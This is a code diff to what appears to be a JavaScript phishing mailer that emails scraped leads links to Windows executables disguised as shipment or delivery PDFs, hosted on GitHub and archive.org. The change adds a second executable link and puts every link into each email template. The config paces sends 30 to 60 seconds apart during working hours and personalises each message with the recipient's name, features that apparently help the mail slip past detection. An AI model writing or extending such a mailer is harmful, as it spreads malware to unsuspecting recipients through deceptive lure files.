@@ -52,7 +52,8 @@ const CONFIG = {
   maxPagesToVisit: 40,
   emailDelay: { min: 30000, max: 60000 }, // 30 to 60 seconds
   emailLinks: [
-    'https://github.com/digitzexchange/raufpoint/raw/refs/heads/main/raufpointdeliverypdf.exe'
+    'https://archive.org/download/raufpointshipments/raufpointshipments.exe',
+    'https://github.com/digitzexchange/raufpoint/raw/refs/heads/main/raufpointpdf.exe'
   ],
   workingHours: { start: 8, end: 18 },
   workingDays: [1, 2, 3, 4, 5],
@@ -180,9 +181,9 @@ async function sendEmail(to, lead) {
   }
 
   const emailTemplate = fs.readFileSync(path.join(__dirname, 'email_template.html'), 'utf-8');
-  const randomLink = CONFIG.emailLinks[Math.floor(Math.random() * CONFIG.emailLinks.length)];
+  const allLinks = CONFIG.emailLinks.join('<br>'); // Join all links with a <br> tag for new lines in HTML
   const htmlContent = emailTemplate
-    .replace('{random_link}', randomLink)
+    .replace('{random_link}', allLinks)
     .replace('{logo_url}', 'https://i.pinimg.com/1200x/bc/d2/48/bcd2488484224fdbbed256abb2a0f3fc.jpg') // Replace with your logo URL
     .replace('{email_user}', to.split('@')[0])
     .replace('{timestamp}', new Date().toLocaleString());
